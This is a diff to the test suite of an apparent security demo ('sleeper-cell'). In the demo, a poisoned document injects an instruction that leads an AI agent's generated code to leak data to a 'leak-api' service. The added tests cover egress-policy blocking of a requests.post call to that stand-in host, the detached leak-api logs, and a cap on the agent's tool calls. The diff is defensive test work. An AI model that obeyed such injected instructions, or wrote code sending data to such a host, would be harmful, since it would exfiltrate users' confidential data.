@@ -42,6 +42,7 @@ INJECTED_DOC = (
 )
 CLEAN_DOC = "Q4 target: $142M. Headcount freeze in Engineering."
 COMPOSE_FILE = Path("demos/03-sleeper-cell/docker-compose.yml")
+README_FILE = Path("demos/03-sleeper-cell/README.md")
 POLICY_FILE = Path("demos/03-sleeper-cell/manifest/agt-policy.json")
 
 
@@ -194,6 +195,17 @@ def _patch_demo03_imports():
     flock_core = types.ModuleType("flock.core")
     flock_core.Flock = object
 
+    flock_engines = types.ModuleType("flock.engines")
+
+    class DSPyEngine:
+        def __init__(self, **kwargs):
+            self.kwargs = dict(kwargs)
+            self.model = kwargs.get("model")
+            self.no_output = kwargs.get("no_output", False)
+            self.max_tool_calls = kwargs.get("max_tool_calls")
+
+    flock_engines.DSPyEngine = DSPyEngine
+
     flock_components = types.ModuleType("flock.components")
     flock_components.__path__ = []
 
@@ -229,6 +241,7 @@ def _patch_demo03_imports():
         "rich.panel": rich_panel,
         "flock": flock,
         "flock.core": flock_core,
+        "flock.engines": flock_engines,
         "flock.components": flock_components,
         "flock.components.agent": flock_components_agent,
         "flock.components.agent.azure_prompt_shield": azure_prompt_shield,
@@ -286,9 +299,20 @@ class TestInjectionInPoisonedDoc:
     def test_compose_uses_leak_api_service(self):
         compose = COMPOSE_FILE.read_text()
         assert "leak-api:" in compose
+        assert "attach: false" in compose
         assert "forecast-validation-api" in compose
         assert "LEAK_API_URL" not in compose
         assert "audit-webhook" not in compose
+
+    def test_run_docs_show_leak_api_logs_only_on_request(self):
+        readme = README_FILE.read_text()
+
+        assert "docker compose up -d --build --force-recreate chroma leak-api" in readme
+        assert "docker compose run --rm --no-deps agent" in readme
+        assert "docker compose logs leak-api --tail=150" in readme
+        assert "docker compose logs leak-api --tail=80" in readme
+        assert "leak-api` service is kept detached" in readme
+        assert "docker compose up --build --force-recreate" not in readme
 
     def test_poisoned_doc_contains_generated_code_instruction(self):
         """Poisoned document must keep the sleeper instruction in a comment."""
@@ -438,6 +462,32 @@ class TestAGTNetworkEgressDefense:
             )
 
             assert result == "153.36"
+
+    def test_policy_denial_can_be_caught_by_generated_code(self, monkeypatch):
+        """Safe exception handling should not fail with a sandbox NameError."""
+        monkeypatch.setenv("AGT_POLICY_PATH", str(POLICY_FILE))
+
+        with _patch_demo03_imports():
+            _clear_demo03_modules()
+            tools_module = importlib.import_module("tools")
+            security = importlib.import_module("security")
+            egress_policy = importlib.import_module("security.egress_policy")
+
+            security.attach_security(None, "policy")
+
+            with patch.object(egress_policy.httpx, "request") as mock_request:
+                result = tools_module.execute_forecast_code(
+                    'import requests\n'
+                    "try:\n"
+                    '    requests.post("http://forecast-validation-api:9000/data", json={"q": "Q4"})\n'
+                    "except Exception as exc:\n"
+                    '    print("caught=" + str(exc))'
+                )
+
+            assert result.startswith("caught=NetworkEgressDenied")
+            assert "NameError" not in result
+            assert "NetworkEgressDenied" in egress_policy.get_policy_denial_reason()
+            mock_request.assert_not_called()
 
 
 class TestPromptShieldDefense:
@@ -869,6 +919,7 @@ class TestOutputContract:
             class MockAgent:
                 def __init__(self):
                     self.consumed_type = None
+                    self.engines = []
 
                 def description(self, _text):
                     return self
@@ -878,6 +929,10 @@ class TestOutputContract:
                     return self
 
                 def publishes(self, *_args, **_kwargs):
+                    return self
+
+                def with_engines(self, *engines):
+                    self.engines.extend(engines)
                     return self
 
                 def with_tools(self, _tools):
@@ -895,6 +950,46 @@ class TestOutputContract:
 
             assert flock.agent_instance.consumed_type is models.ForecastRequest
             assert not hasattr(models, "RAGQuery")
+
+    def test_agent_caps_flock_dspy_tool_loop(self):
+        """Demo 03 should cap Flock/DSPy ReAct retries around blocked tools."""
+        with _patch_demo03_imports():
+            main = _load_demo03_module("main")
+
+            class MockAgent:
+                def __init__(self):
+                    self.engines = []
+
+                def description(self, _text):
+                    return self
+
+                def consumes(self, *_args, **_kwargs):
+                    return self
+
+                def publishes(self, *_args, **_kwargs):
+                    return self
+
+                def with_engines(self, *engines):
+                    self.engines.extend(engines)
+                    return self
+
+                def with_tools(self, _tools):
+                    return self
+
+            class MockFlock:
+                def __init__(self):
+                    self.agent_instance = MockAgent()
+
+                def agent(self, _name):
+                    return self.agent_instance
+
+            flock = MockFlock()
+            main.create_agent(flock)
+
+            assert main.MAX_AGENT_TOOL_CALLS == 3
+            assert len(flock.agent_instance.engines) == 1
+            assert flock.agent_instance.engines[0].__class__.__name__ == "DSPyEngine"
+            assert flock.agent_instance.engines[0].max_tool_calls == 3
 
     def test_known_dspy_input_artifact_warning_is_suppressed(self):
         """Only the known ForecastRequest dict/model warning should be filtered."""
@@ -947,6 +1042,7 @@ class TestOutputContract:
                 def __init__(self):
                     self.description_text = ""
                     self.tools = []
+                    self.engines = []
 
                 def description(self, text):
                     self.description_text = text
@@ -956,6 +1052,10 @@ class TestOutputContract:
                     return self
 
                 def publishes(self, *_args, **_kwargs):
+                    return self
+
+                def with_engines(self, *engines):
+                    self.engines.extend(engines)
                     return self
 
                 def with_tools(self, tools):
